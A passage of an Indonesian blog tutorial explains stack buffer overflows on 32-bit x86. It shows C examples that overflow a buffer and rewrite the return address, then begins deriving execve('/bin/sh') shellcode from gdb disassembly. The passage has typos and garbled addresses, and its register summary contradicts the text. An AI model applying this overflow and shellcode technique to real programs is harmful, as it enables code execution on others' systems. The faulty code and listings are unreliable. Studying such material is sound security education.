+<p data-adtags-visited="true">int main()</p>
+<p data-adtags-visited="true">{</p>
+<p class="inline-ad-slot" id="inline-ad-2" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">fungsi(1,2);</p>
+<p data-adtags-visited="true">return 0;</p>
+<p data-adtags-visited="true">}</p>
+<p data-adtags-visited="true">Untuk menghasilkan kode assembly dapat digunakan program gcc dengan menyertakan option –S saat mengkompilasi file di atas :</p>
+<p data-adtags-visited="true">$ gcc –S –o coba1.s&nbsp; coba1.c</p>
+<p data-adtags-visited="true">Di fungsi main() pemanggilan fungsi fungsi() diubah ke dalam bahasa assembly sebagai berikut :</p>
+<p data-adtags-visited="true">push $2</p>
+<p data-adtags-visited="true">Push $1</p>
+<p data-adtags-visited="true">call fungsi</p>
+<p data-adtags-visited="true"><a href="https://sholeh012.files.wordpress.com/2011/11/stack2.jpg"><img data-attachment-id="58" data-permalink="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/stack2/" data-orig-file="https://sholeh012.files.wordpress.com/2011/11/stack2.jpg" data-orig-size="485,128" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="stack2" data-image-description="" data-medium-file="https://sholeh012.files.wordpress.com/2011/11/stack2.jpg?w=300" data-large-file="https://sholeh012.files.wordpress.com/2011/11/stack2.jpg?w=485" class="alignnone size-medium wp-image-58" title="stack2" src="Buffer%20OverFlow%20|%20sholeh012_files/stack2.jpg" alt="" width="300" height="102"></a></p>
+<h6>Gambar 2. Blok memori dari stack pada pemanggilan fungsi</h6>
+<p data-adtags-visited="true">Sebelum memanggil fungsi fungsi() dua buah
+ argumen sebagai parameter ditambahkan ke stack. Instruksi call di atas 
+secara implisit juga akan menyimpan instruction pointer (IP) ke stack. 
+IP ini selanjutnya akan di sebut dengan return address (RET).</p>
+<p data-adtags-visited="true">Kode assembly yang di bangkitkan pada fungsi fungsi();</p>
+<ol>
+<li>pushl %ebp</li>
+<li>movl %esp, %ebp</li>
+<li>subl&nbsp; $24,%esp</li>
+</ol>
+<p class="inline-ad-slot" id="inline-ad-3" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Baris
+ pertama akan menyimpan frame pointer EBP ke stack untuk kemudian di 
+baris kedua menggunakan SP sebagai frame pointer yang aktual. Pada baris
+ ketiga 24 byte memori untuk variabel lokal buffer[ ] dialokasikan di 
+stack, walau hanya 8 byte yang digunakan.</p>
+<ol>
+<li>movl 8(%ebp), %eax</li>
+<li>movl %eax, -8(%ebp)</li>
+<li>movl 12(%ebp), %eax</li>
+<li>movl %eax, -4(%ebp)</li>
+</ol>
+<p data-adtags-visited="true">Baris diatas adalah pengesetan variabel 
+buffer [ ] dengan parameter dari fungsi. Seperti telihat pada baris 
+pertama, pengaksesan ke parameter satu di stack dilakukan dengan 
+pengalamatan relatif terhadap frame pointer EBP. Setelah nilai ini 
+disimpan di register EAX maka dengan cara yang sama nilai ini di simpan 
+ke stack yang jaraknya –8 byte terhadap frame pointer EBP (baris kedua).
+ Stack ini identik dengan variable buffer[0]. Baris ketiga dan keempat 
+melakukan hal yang sama untuk parameter dua. Dari uraian diatas, maka 
+blok memori stack dapat dilukiskan seperti gambar 2.</p>
+<p data-adtags-visited="true">Seperti yang sudah dikemukakan diatas, 
+prosesor yang digunakan adalah Intel x86 yang menggunakan bus 32-bit 
+atau 4 byte dalam pengaksesan ke memori, sehingga pengalamatan ke memori
+ selalu merupakan kelipatan 4 byte, sedangkan besar dari tipe data int 
+dan pointer adalah 4 byte juga.</p>
+<p data-adtags-visited="true">Dari gambar diatas terlihat jelas bahwa 
+memori parameter fungsi mempunyai jarak relatif yang positif terhadap 
+frame pointer EBP, sedangkan variable local seperti buffer mempunyai 
+jarak relatif yang negatif.</p>
+<p data-adtags-visited="true">Jika variable lokal merupakan sebuah 
+array, maka array dengan indeks terkecil mempunyai alamat memori yang 
+paling kecil juga. Dengan kata lain elemen variable array di simpan 
+dengan indeks membesar ke arah alamat memori yang juga membesar. Pada 
+stack, ini adalah arah ke posisi bawah dari blok memori stack. Sifat 
+stack inilah yang memungkinkan terjadinya <em>buffer overflow</em>.</p>
+<h4>Buffer Overflow</h4>
+<p data-adtags-visited="true"><em>Buffer overflow</em> memiliki arti 
+suatu keadaan di mana data yang diisikan ke suatu buffer mempunyai 
+ukuran yang lebih besar dibandingkan ukuran buffer itu sendiri. Untuk 
+lebih memahami <em>buffer overflow</em>, dapat dianalogikan dengan 
+kehidupan sehari-hari, yaitu saat kita mengisi bak mandi melebihi daya 
+tampungnya, maka air yang kita isikan akan meluap <em>(overflow</em>).</p>
+<p class="inline-ad-slot" id="inline-ad-4" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Berikut ini contoh sebuah program dalam bahasa C yang mengandung <em>buffer overflow.</em></p>
+<p data-adtags-visited="true"># Coba2.c</p>
+<p data-adtags-visited="true">#include&lt;stdio.h&gt;</p>
+<p data-adtags-visited="true">void fungsi(char* txt)</p>
+<p data-adtags-visited="true">{</p>
+<p data-adtags-visited="true">char buffer[4];</p>
+<p data-adtags-visited="true">strcpy(buffer, txt);</p>
+<p data-adtags-visited="true">}</p>
+<p data-adtags-visited="true">int main()</p>
+<p data-adtags-visited="true">{</p>
+<p data-adtags-visited="true">char buffer[17];</p>
+<p data-adtags-visited="true">int i;</p>
+<p data-adtags-visited="true">for (I=0; i&lt;16;I++)</p>
+<p data-adtags-visited="true">buffer[i]=0x19;</p>
+<p data-adtags-visited="true">fungsi(buffer);</p>
+<p data-adtags-visited="true">return 0;</p>
+<p class="inline-ad-slot" id="inline-ad-5" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">}</p>
+<p data-adtags-visited="true">Setelah sukses dikompilasi maka ketika program diatas dieksekusi akan ada pesan <em>segmentation violation</em>.
+ Mengapa demikian ? Karena di fungsi fungsi(), variable array buffer 
+didefinisikan hanya berukuran 4 byte, sedangkan data yang disalinkan 
+kepadanya berukuran sebesar 17 byte. Sebagai catatan, fungsi stcpy() 
+akan menyalinkan data yang direferensi oleh pointer txt ke buffer sampai
+ karakter null ditemukan di txt.</p>
+<p data-adtags-visited="true">Berikut ini adalah sintaks fungsi strcpy :</p>
+<p data-adtags-visited="true">Char *strcpy(char *dest, const char *src);</p>
+<p data-adtags-visited="true">Kondisi blok memori stack saat ter-overflow setelah pemanggilan fungsi diatas dapat dilihat pada gambar 3.</p>
+<p data-adtags-visited="true"><a href="https://sholeh012.files.wordpress.com/2011/11/buffer2.jpg"><img data-attachment-id="59" data-permalink="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/buffer2/" data-orig-file="https://sholeh012.files.wordpress.com/2011/11/buffer2.jpg" data-orig-size="447,54" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="buffer2" data-image-description="" data-medium-file="https://sholeh012.files.wordpress.com/2011/11/buffer2.jpg?w=300" data-large-file="https://sholeh012.files.wordpress.com/2011/11/buffer2.jpg?w=447" class="alignnone size-medium wp-image-59" title="buffer2" src="Buffer%20OverFlow%20|%20sholeh012_files/buffer2.jpg" alt=""></a></p>
+<p data-adtags-visited="true"><a href="https://sholeh012.files.wordpress.com/2011/11/buffer.jpg"><img data-attachment-id="60" data-permalink="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/buffer/" data-orig-file="https://sholeh012.files.wordpress.com/2011/11/buffer.jpg" data-orig-size="473,100" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="buffer" data-image-description="" data-medium-file="https://sholeh012.files.wordpress.com/2011/11/buffer.jpg?w=300" data-large-file="https://sholeh012.files.wordpress.com/2011/11/buffer.jpg?w=473" class="alignnone size-medium wp-image-60" title="buffer" src="Buffer%20OverFlow%20|%20sholeh012_files/buffer.jpg" alt=""></a></p>
+<p data-adtags-visited="true">&nbsp;</p>
+<h6>Gambar 3. Keadaan blok memori stack saat ter-overflow</h6>
+<p data-adtags-visited="true">Seperti terlihat pada gambar, data yang 
+mempunyai nilai karakter 0x19 sebesar 17 byte disalinkan ke memori stack
+ mulai dari alamat buffer[0] ke arah stack bawah sampai memori stack 
+yang mempunyai pointer *txt. Akibat yang fatal adalah termodifikasinya 
+memori stack yang menyimpan alamat fungsi kembali RET. Dalam hal ini 
+nilai RET berubah menjadi 0x19191919 yang merupakan alamat memori yang 
+instruksinya akan dipanggil setelah fungsi fungsi() selesai dikerjakan. 
+Tentu hal ini akan menyebabkan kesalahan karena instruksi yang terdapat 
+pada alamat memori tersebut bukanlah instruksi yang valid.</p>
+<p data-adtags-visited="true">Kondisi diatas menjadi prinsip apa yang disebut dengan <strong><em>eksploitasi buffer overflow</em></strong>,
+ yaitu membuat buffer ter-overflow sehingga nilai dari RET termodifikasi
+ untuk mengubah alur dari instruksi program sesuai dengan keinginan 
+kita.</p>
+<h5>Mekanisme Eksploitasi Buffer Overflows</h5>
+<p class="inline-ad-slot" id="inline-ad-6" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Secara
+ prinsip ada dua hal penting yang harus dilakukan dalam proses 
+eksploitasi buffer overflow. Pertama harus membuat instruksi yang di 
+kehendaki agar dijalankan setelah buffer ter-overflow. Instruksi yang 
+biasanya berupa kode assembly ini harus dikonversikan ke data 
+heksadesimal. Kedua, harus menghitung alamat posisi RET dalam stack dan 
+alamat kode instruksi. Kemudian alamat kode instruksi ini harus 
+dimasukkan ke dalam nilai RET, sehingga jika buffer ter-overflow 
+instruksi tersebut dijalankan.</p>
+<p data-adtags-visited="true">Menghasilkan instruksi dan kemudian 
+mengkonversinya ke format bilangan heksadesimal bukanlah hal yang mudah,
+ perlu pemahaman cara menghitung alamat posisi RET di stack dan 
+bagaimana cara memodifikasinya.</p>
+<h4>Memodifikasi Nilai RET</h4>
+<p data-adtags-visited="true"><strong>&nbsp;</strong></p>
+<p data-adtags-visited="true">Untuk lebih mudah dimengerti, dibawah ini 
+contoh program kecil yang tujuannya memodifikasi nilai RET sehingga 
+instruksi yang seharusnya dikerjakan setelah pemanggilan suatu fungsi 
+akan dilompati.</p>
+<p data-adtags-visited="true"># Coba3.c</p>
+<p data-adtags-visited="true">#include&lt;stdio.h&gt;</p>
+<p data-adtags-visited="true">void fungsi(int satu, int dua)</p>
+<p data-adtags-visited="true">{</p>
+<p data-adtags-visited="true">int&nbsp; buffer[2];</p>
+<p data-adtags-visited="true">int* tmp;</p>
+<p data-adtags-visited="true">// Jarak ke RET 3*4 byte</p>
+<p data-adtags-visited="true">tmp = buffer+3;</p>
+<p class="inline-ad-slot" id="inline-ad-7" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">//Modifikasi isi dari RET</p>
+<p data-adtags-visited="true">*tmp = *tmp + 10;</p>
+<p data-adtags-visited="true">}</p>
+<p data-adtags-visited="true">int main()</p>
+<p data-adtags-visited="true">{</p>
+<p data-adtags-visited="true">int a;</p>
+<p data-adtags-visited="true">a=1;</p>
+<p data-adtags-visited="true">fungsi(1,2);</p>
+<p data-adtags-visited="true">// Instruksi&nbsp; a=2 akan dilompati</p>
+<p data-adtags-visited="true">a=2;</p>
+<p data-adtags-visited="true">printf(“%d\n”,a);</p>
+<p data-adtags-visited="true">return 0;</p>
+<p data-adtags-visited="true">}</p>
+<p data-adtags-visited="true">Pada pemanggilan fungsi fungsi() nilai RET
+ dimodifikasi di dalam fungsi tersebut, sehingga instruksi a=2 yang 
+seharusnya dikerjakan setelah kembali dari fungsi akan dilompati.</p>
+<p data-adtags-visited="true">Program diatas dikompilasi dengan option –ggdb agar nanti juga dapat dimanfaatkan oleh tool gdb.</p>
+<p class="inline-ad-slot" id="inline-ad-8" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">$&nbsp; gcc&nbsp; -ggdb&nbsp;&nbsp; -o&nbsp;&nbsp; coba3 coba3.c</p>
+<p data-adtags-visited="true">Seperti yang diharapkan, setelah program 
+coba3 dieksekusi, maka dilayar monitor akan keluar tampilan 1 dan bukan 
+2, karena instruksi a=2 tidak dikerjakan. Di bawah ini dipaparkan secara
+ detail bagaimana hal ini bias terjadi.</p>
+<p data-adtags-visited="true">Nilai memori stack yang menyimpan nilai 
+RET dapat dihitung dari jarak antara alamat buffer[ ] dengan alamat RET 
+yaitu sebesar 12 byte. Nilai 3 di atas didapatkan karena operasi 
+aritmatika terhadap sebuah pointer tergantung dari tipe data, yang dalam
+ kasus ini adalah int yang mempunyai ukuran 4 byte. Hal berikut yang 
+harus dilakukan adalah menghitung jarak RET ke alamat yang ingin di tuju
+ yaitu baris yang memanggil fungsi printf(). Jarak ini akan ditambahkan 
+ke nilai RET untuk melompati baris instruksi a=2.</p>
+<p data-adtags-visited="true">Nilai 10 diatas bukanlah hasil kira-kira atau tebak-tebakan, melainkan dihitung dengan bantuan program gdb.</p>
+<p data-adtags-visited="true">$ gdb coba3</p>
+<p data-adtags-visited="true">………</p>
+<p data-adtags-visited="true">(gdb) disassemble main</p>
+<p data-adtags-visited="true">Dump of assembler code for function main :</p>
+<p data-adtags-visited="true">Ox8048430 &lt;main&gt;&nbsp; : push %ebp</p>
+<p data-adtags-visited="true">Ox8048431 &lt;main+1&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : move %esp,%ebp</p>
+<p data-adtags-visited="true">Ox8048433 &lt;main+3&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : sub&nbsp; $0x18,%esp</p>
+<p data-adtags-visited="true">Ox8048436 &lt;main+6&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : movl $0x1,0xfffffffc(%ebp)</p>
+<p data-adtags-visited="true">Ox804843d &lt;main+13&gt;&nbsp;&nbsp;&nbsp;&nbsp; : add&nbsp; 0xfffffff8,%esp</p>
+<p class="inline-ad-slot" id="inline-ad-9" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Ox8048440 &lt;main+16&gt;&nbsp;&nbsp;&nbsp;&nbsp; : push $0x2</p>
+<p data-adtags-visited="true">Ox8048442 &lt;main+18&gt;&nbsp;&nbsp;&nbsp;&nbsp; : push $0x1</p>
+<p data-adtags-visited="true">Ox8048444 &lt;main+20&gt;&nbsp;&nbsp;&nbsp;&nbsp; : call 0x8048410 &lt;fungsi&gt;</p>
+<p data-adtags-visited="true">Ox8048449 &lt;main+25&gt;&nbsp;&nbsp;&nbsp;&nbsp; : add&nbsp; $0x10,%esp</p>
+<p data-adtags-visited="true">Ox804844c &lt;main+28&gt;&nbsp;&nbsp;&nbsp;&nbsp; : movl $0x2,0xfffffffc(%ebp)</p>
+<p data-adtags-visited="true">Ox8048453 &lt;main+35&gt;&nbsp;&nbsp;&nbsp;&nbsp; : add&nbsp; $0xfffffff8,%esp</p>
+<p data-adtags-visited="true">Ox8048456 &lt;main+38&gt;&nbsp;&nbsp;&nbsp;&nbsp; : mov 0xfffffffc(%ebp),%eax</p>
+<p data-adtags-visited="true">Ox8048459 &lt;main+41&gt;&nbsp;&nbsp;&nbsp;&nbsp; : push %eax</p>
+<p data-adtags-visited="true">Ox804845a &lt;main+42&gt;&nbsp;&nbsp;&nbsp;&nbsp; : push $0x80484e4</p>
+<p data-adtags-visited="true">Ox804845f &lt;main+47&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : call</p>
+<p data-adtags-visited="true">Ox8048300 &lt;printf&gt;</p>
+<p data-adtags-visited="true">………</p>
+<p data-adtags-visited="true">Setelah fungsi fungsi() selesai dikerjakan
+ maka seharusnya instruksi pada alamat 0x8048449&nbsp; &lt;main+25&gt; 
+dikerjakan, karena alamat 0x8048449 inilah yang disimpan oleh RET. 
+Sedang instruksi a=2 yang ingin dilompati dapat dilihat pada alamat 
+0x804844c&nbsp; &lt;main+28&gt;. Jarak yang diinginkan dapat dihitung 
+dengan mengurangi alamat instruksi berikutnya dengan alamat RET, yaitu 
+0x8048453-0x8048449=0xA atau 10.</p>
+<p data-adtags-visited="true">Perubahan nilai RET dengan cara seperti diatas <em>hanyalah sebuah contoh</em>
+ yang mungkin tidak ada dalam dunia pemrograman. Pada hampir semua 
+kasus, pengubahan nilai RET biasanya dilakukan dengan memanfaatkan 
+buffer overflow seperti&nbsp; pada program coba2.c Pada program tersebut
+ pointer *txt akan mengacu ke data buffer yang berisi instruksi yang 
+akan dikerjakan setelah stack ter-overflow. Untuk itu nilai RET juga 
+harus dimodifikasi sehingga mengacu ke instruksi tersebut.</p>
+<h5>Memperbaiki Sistem yang Mengalami Buffer Overflows</h5>
+<h5>Untuk maksud tersebut diatas caranya dengan membuat program yang menghasilkan kode <em>instruksi Shell</em>.
+ Instruksi ini digunakan untuk dipanggil jika buffer ter-overflow. 
+Banyak sekali faktor yang berpengaruh pada kondisi ini. Salah satunya 
+adalah berapa besar buffer yang dapat digunakan untuk menampung 
+instruksi. Sebagai contoh akan dibahas program di bawah yaitu cara 
+membuat kode <em>instruksi shell</em>&nbsp; yang di tulis dalam bahasa C.</h5>
+<p class="inline-ad-slot" id="inline-ad-10" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true"># buffercode.c</p>
+<p data-adtags-visited="true">#include &lt;stdio.h&gt;</p>
+<p data-adtags-visited="true">int main()</p>
+<p data-adtags-visited="true">{</p>
+<p data-adtags-visited="true">char* cmd[2];</p>
+<p data-adtags-visited="true">cmd[10] = “/bin/sh”;</p>
+<p data-adtags-visited="true">cmd[1]&nbsp; = NULL;</p>
+<p data-adtags-visited="true">execve(cmd[0], cmd, NULL);</p>
+<p data-adtags-visited="true">return 0;</p>
+<p data-adtags-visited="true">}</p>
+<p data-adtags-visited="true">Yang penting diperhatikan adalah baris 
+execve(cmd[0], cmd, NULL) yang akan menjalankan shell baru /bin/sh. Agar
+ nantinya dapat dikonversi ke dalam format heksadesimal, sebelumnya 
+harus tahu instruksi di atas dalam bahasa assembly. Pertama-tama 
+instruksi tersebut dikompilasi dengan menggunakan option –static agar 
+fungsi execve() juga dimasukkan ke obyek program.</p>
+<p data-adtags-visited="true">$&nbsp;&nbsp; gcc&nbsp;&nbsp; -ggdb&nbsp; -static&nbsp; -o buffercode&nbsp; buffercode.c</p>
+<p data-adtags-visited="true">Kemudian dengan program gdb atau ddd akan dibandingkan program diatas dengan instruksi assembly.</p>
+<p data-adtags-visited="true">$ gdb buffercode</p>
+<p class="inline-ad-slot" id="inline-ad-11" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">…..</p>
+<p data-adtags-visited="true">(gdb) disassembly main</p>
+<p data-adtags-visited="true">Ox8048le0 &lt;main&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :push %ebp</p>
+<p data-adtags-visited="true">Ox8048le1 &lt;main+1&gt;&nbsp;&nbsp;&nbsp; :move %esp,%ebp</p>
+<p data-adtags-visited="true">Ox8048le3 &lt;main+3&gt;&nbsp;&nbsp;&nbsp; :sub&nbsp; $0x18,%esp</p>
+<p data-adtags-visited="true">Ox8048le6 &lt;main+6&gt;&nbsp;&nbsp;&nbsp; :movl $0x8089bc8,0xfffffff8(%ebp)</p>
+<p data-adtags-visited="true">Ox8048led &lt;main+13&gt;&nbsp; :movl $0x0,0xfffffffc,(%ebp)</p>
+<p data-adtags-visited="true">Ox8048lf4 &lt;main+20&gt;&nbsp; :add&nbsp; $0xfffffffc,%esp</p>
+<p data-adtags-visited="true">Ox8048le7 &lt;main+23&gt; :push $0x0</p>
+<p data-adtags-visited="true">Ox8048le9 &lt;main+25&gt; :lea&nbsp; 0fffffff8(%ebp),%eax</p>
+<p data-adtags-visited="true">Ox8048lfc &lt;main+28&gt; :push %eax</p>
+<p data-adtags-visited="true">Ox8048lfd &lt;main+29&gt; :mov&nbsp; 0xfffffff8(%ebp),%eax</p>
+<p data-adtags-visited="true">Ox8048200 &lt;main+32&gt; :push %eax</p>
+<p data-adtags-visited="true">Ox8048201 &lt;main+33&gt; :call 0x804c460 &lt;_execve&gt;</p>
+<p data-adtags-visited="true">Ox8048206 &lt;main+38&gt; :add&nbsp; $0x10,%esp</p>
+<p data-adtags-visited="true">Ox8048209 &lt;main+41&gt; :xor&nbsp; %eax,%eax</p>
+<p class="inline-ad-slot" id="inline-ad-12" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">0x804820b &lt;main+43&gt; :jmp&nbsp; 0x8048210 &lt;main+48&gt;</p>
+<p data-adtags-visited="true">Ox804820d &lt;main+45&gt; :lea&nbsp; 0x0(%esi),%esi</p>
+<p data-adtags-visited="true">Ox8048210 &lt;main+48&gt;&nbsp;&nbsp;&nbsp;&nbsp; :mov&nbsp; %ebp,%esp</p>
+<p data-adtags-visited="true">Ox8048212 &lt;main+50&gt;&nbsp;&nbsp;&nbsp;&nbsp; :pop&nbsp; %ebp</p>
+<p data-adtags-visited="true">Ox8048213 &lt;main+51&gt;&nbsp;&nbsp;&nbsp;&nbsp; :ret</p>
+<p data-adtags-visited="true">instruksi</p>
+<ol>
+<li>cmd[0] = “/bin/sh”;</li>
+<li>cmd[1] = NULL;</li>
+</ol>
+<p data-adtags-visited="true">identik dengan</p>
+<ol>
+<li>movl $0x8089bc8,0xfffffff8(%ebp)</li>
+<li>movl $0x0,0xfffffffc(%ebp)</li>
+</ol>
+<p data-adtags-visited="true">Nilai 0x8089bc8 yang merupakan alamat 
+memori string “/bin/sh” disalinkan ke cmd[0]. Sebagai catatan, bentuk 
+dari 0xfffffff8(%ebp) berarti pengalamatan negatif, relatif terhadap 
+register EBP. Nilai 0xfffffff8 adalah bentuk komplementer, yang nilai 
+negatifnya didapatkan dengan cara berikut :</p>
+<ol>
+<li>negasi dari 0xfffffff8 adalah 0x00000007</li>
+<li>tambahkan hasilnya dengan satu, 0x00000007+1=0x00000008</li>
+</ol>
+<p data-adtags-visited="true">Dengan demikian, instruksi movl $0x8089bc8,0xfffffff8(%ebp)&nbsp; identik dengan movl&nbsp; $0x8089bc8, -8(%ebp).</p>
+<p data-adtags-visited="true">Sebelum memanggil system call execve(), 
+argumen yang dibutuhkan akan disalinkan terlebih dahulu ke dalam stack 
+dengan urutan dari belakang seperti berikut :</p>
+<p class="inline-ad-slot" id="inline-ad-13" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Ox80481f7 &lt;main+23&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : push $0x0</p>
+<p data-adtags-visited="true">Ox80481f9 &lt;main+25&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : lea&nbsp; 0xfffffff8(%ebp),%eax</p>
+<p data-adtags-visited="true">Ox80481fc &lt;main+28&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : push %eax</p>
+<p data-adtags-visited="true">Ox80481fd &lt;main+29&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : mov&nbsp; 0xfffffff8(%ebp),%eax</p>
+<p data-adtags-visited="true">Ox8048200 &lt;main+32&gt;&nbsp;&nbsp;&nbsp;&nbsp; : push %eax</p>
+<p data-adtags-visited="true">Ox8048201 &lt;main+33&gt;&nbsp;&nbsp;&nbsp;&nbsp; : call</p>
+<p data-adtags-visited="true">Ox8048460 &lt;_execve&gt;</p>
+<p data-adtags-visited="true">Mula-mula NULL disalinkan ke stack, 
+kemudian lewat register EAX alamat cmd[ ] juga disalinkan ke stack. Yang
+ terakhir, alamat string “/bin/sh”, juga dengan bantuan register EAX, 
+disalinkan ke stack, sebelum sistem call execve() dipanggil. Pada Linux,
+ fungsi sistem call akan dipanggil lewat software-interrupt. Argumen 
+yang di sertakan harus di salinkan ke register yang sudah di tentukan. 
+Semua fungsi sistem call ini disimpan dalam sebuah tabel yang dapat 
+diaktifkan lewat indeksnya. Fungsi execve() ini mempunyai indeks nomor 
+0xb.</p>
+<p data-adtags-visited="true">Kode assembly dari fungsi ini dapat dilihat dengan bantuan gdb. Akan diperlihatkan beberapa kode penting fungsi tersebut :</p>
+<p data-adtags-visited="true">(gdb) disassemble _execve</p>
+<p data-adtags-visited="true">…….</p>
+<p data-adtags-visited="true">Ox804c46d &lt;_execve+13&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : mov&nbsp; 0x8(%ebp),%edi</p>
+<p data-adtags-visited="true">Ox804c470 &lt;_execve+16&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : test %eax,%eax</p>
+<p class="inline-ad-slot" id="inline-ad-14" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Ox804c472 &lt;_execve+18&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : je Ox804c479 &lt;_execve+25&gt;</p>
+<p data-adtags-visited="true">Ox804c474 &lt;_execve+20&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : call 0x0</p>
+<p data-adtags-visited="true">Ox804c479 &lt;_execve+25&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : mov&nbsp; 0xc(%ebp),%ecx</p>
+<p data-adtags-visited="true">Ox804c47c &lt;_execve+28&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : mov&nbsp; 0x10(%ebp),%edx</p>
+<p data-adtags-visited="true">Ox804c47f &lt;_execve+31&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : push %ebx</p>
+<p data-adtags-visited="true">Ox804c480 &lt;_execve+32&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : mov&nbsp; %edi,%ebx</p>
+<p data-adtags-visited="true">Ox804c482 &lt;_execve+34&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : mov&nbsp; $0xb,%eax</p>
+<p data-adtags-visited="true">Ox804c487 &lt;_execve+39&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : int&nbsp; $0x80</p>
+<p data-adtags-visited="true">……….</p>
+<p data-adtags-visited="true">Mula-mula alamat string”/bin/sh” 
+disalinkan ke register EDI, lalu alamat cmd[ ] juga disalinkan ke 
+register ECX, dilanjutkan dengan penyalinan pointer NULL ke register 
+EDX. Alamat string “/bin/sh” yang tersimpan di register EDI akan 
+dipindahkan ke register EBX. Indeks nomor 0xb fungsi execve() akan 
+disalinkan ke regoster EAX terlebih dahulu sebelum akhirnya 
+software-interupt nomor 0x80 dipanggil.</p>
+<p data-adtags-visited="true">Secara ringkas untuk membuat kode shell berikut ini adalah beberapa hal yang harus dilakukan :</p>
+<ol>
+<li>mendefinisikan string “/bin/sh” di memori</li>
+<li>menentukan alamat string di atas</li>
+<li>menyalinkan alamat array, dengan indeks pertama array ini mengacu ke
+ string di atas, dan indeks kedua yang berisi pointer NULL, ke register 
+EBX (lihat gambar 4).</li>
+<li>menyalinkan alamat string di atas ke register ECX</li>
+<li>menyalinkan alamat NULL ke register EDX</li>
+<li>menyalinkan 0xb ke register EAX</li>
+<li>mengeksekusi instruksi int 0x80</li>
+</ol>
+<table cellspacing="0" cellpadding="0" border="1">
+<tbody>
+<tr>
+<td width="163" valign="top">Alamat cmd[0]</td>
+<td width="107" valign="top">Cmd[0]</td>
+<td width="97" valign="top"></td>
+<td width="144" valign="top">“/bin/sh”</td>
+</tr>
+<tr>
